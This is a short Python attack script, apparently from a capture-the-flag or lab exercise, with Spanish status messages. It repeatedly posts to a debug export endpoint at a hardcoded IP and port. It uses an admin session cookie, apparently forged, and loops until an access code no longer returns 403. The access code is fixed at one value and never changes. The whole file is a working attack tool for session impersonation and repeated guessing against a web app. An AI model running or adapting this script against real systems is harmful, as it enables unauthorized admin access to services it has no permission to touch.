import requests
import time

url = "http://154.57.164.67:32029/document/debug/export"

headers = {
    "Cookie": "user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-0838413777685b5593518e0c65c1af1a4d979d38a609d7c58ffc3427289929b8",
    "Content-Type": "application/x-www-form-urlencoded"
}

access_pass = "7331"
i = 0

while True:
    data = {
        "access_pass": access_pass,
        "content": "testing"
    }

    try:
        print(i)
        i += 1

        response = requests.post(
            url,
            headers=headers,
            data=data,
            timeout=3
        )
        print(response.text)
        print(f"[+] Probando access_pass={access_pass} → Status {response.status_code}")

        if response.status_code != 403:
            print(f"[✓] access_pass válido encontrado: {access_pass}")
            break

    except requests.exceptions.Timeout:
        print("[!] Timeout — el servidor está saturado, reintentando...")
        time.sleep(1)

    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión: {e}")
        time.sleep(2)

    time.sleep(0.2)
